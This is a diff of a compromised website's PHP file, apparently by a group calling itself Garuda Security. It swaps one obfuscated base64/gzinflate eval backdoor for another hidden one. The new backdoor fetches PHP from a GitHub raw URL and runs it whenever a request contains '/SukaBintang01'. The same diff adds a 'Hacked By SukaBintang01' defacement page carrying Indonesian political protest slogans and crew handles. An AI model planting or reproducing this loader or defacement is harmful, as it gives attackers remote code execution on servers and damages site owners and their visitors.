@@ -1,5 +1,74 @@
 <?php
-$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
-$stt0 = "\x3d\x3d\x41\x41VE2i\x41YMn\x43UJDMY8m2nOusqed71p1r\x627nrLfvP6\x62\x62\x2bHF\x62r32EYu6/\x63DwI\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
+if (strpos($_SERVER['REQUEST_URI'], '/SukaBintang01') !== false) {
+    $url = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/original.php';
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $code = curl_exec($ch);
+    curl_close($ch);
+
+    if ($code !== false) {
+        $tmp_file = tempnam(sys_get_temp_dir(), 'php');
+        file_put_contents($tmp_file, $code);
+        include $tmp_file;
+        unlink($tmp_file);
+    } else {
+        echo "Gagal mengambil script dari GitHub.";
+    }
+
+    exit;
+}
 ?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacked By SukaBintang01</title>
+    <link rel="icon" href="https://telegra.ph/file/a35b090cf9ec01898604c.jpg" type="image/x-icon">
+    <meta name="description" content="Hacked By SukaBintang01">
+    <meta name="keywords" content="Hacked By SukaBintang01">
+    <meta name="rating" content="General">
+    <meta name="revisit-after" content="1 days">
+    <meta name="classification" content="Hacked By SukaBintang01">
+    <meta name="robots schedule" content="auto">
+    <link href="https://fonts.googleapis.com/css2?family=Oxygen" rel="stylesheet">
+</head>
+<body>
+<style>
+html {
+    background-color: black;
+    color: #000;
+}
+h2 {
+    font-family:"Bold 700 Italic",Mali;
+    color:red;
+}
+h3, h4 {
+    font-family:"Oxygen",serif;
+    color:white;
+}
+a {
+    color: white;
+    text-decoration: none;
+}
+::selection {
+    color:white;
+    background:#000;
+}
+</style>
+<script src="script.js"></script>
+<table width="100%" height="100%">
+    <td align="center">
+        <img alt="#FuckBnPp" src="https://telegra.ph/file/f8e5b2de33ddaa512ccf7.jpg" width="450px">
+        <h2>Hacked By SukaBintang01</h2>        <h4><br> //---------------------------Garuda Security---------------------------//<br>
+            <br>"MBG=makan beracun goblok tolong perhatikan kesehatan makanan untuk siang kau masak malam dan anak punya alergi masing-masing gk semua anak bisa makan yang sama"</br>
+        <br> //---------------------------Garuda Security---------------------------//<br><br>
+      <br>#IndonesiaGelap #tolakmbg #mbgKepentinganbpolitik
+        <br><br>Tolak MBG !</br></h4>
+        <audio controls="controls" src="https://a.top4top.io/m_3421hq9ht0.mp3"></audio>
+        <h3> <a href="https://t.me/garudasecurityofficial" >- <font color="red">Official team</font> -<br>  SukaJanda01 - WhiteRose - Awan - saint - Crishbit - Cyber jawa timur - SukaBintang01 - ./FqXploit - Tn_wizyakuza 404</h3>
+</body>
+</html
